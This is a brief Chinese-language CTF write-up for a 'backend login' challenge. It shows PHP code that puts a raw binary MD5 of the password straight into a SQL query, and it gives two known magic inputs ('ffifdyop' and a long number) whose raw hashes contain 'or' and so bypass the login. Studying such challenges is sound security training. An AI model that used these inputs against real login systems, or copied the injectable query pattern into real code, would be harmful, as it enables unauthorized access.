题目地址: [后台登录](http://www.shiyanbar.com/ctf/2036)

```php
$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";
    $result=mysqli_query($link,$sql);
        if(mysqli_num_rows($result)>0){
            echo 'flag is :'.$flag;
        }
        else{
            echo '密码错误!';
        }
```


```php
$str = "ffifdyop";

// 276f722736c95d99e921722cf9ed621c
echo md5($str), "\n";

// 'or'6�]��!r,��b%
echo md5($str, true), "\n";


$str2 = "129581926211651571912466741651878684928";

// 06da5430449f8f6f23dfc1276f722738
echo md5($str2), "\n";

// �T0D�#��'or'8
echo md5($str2, true), "\n";

```
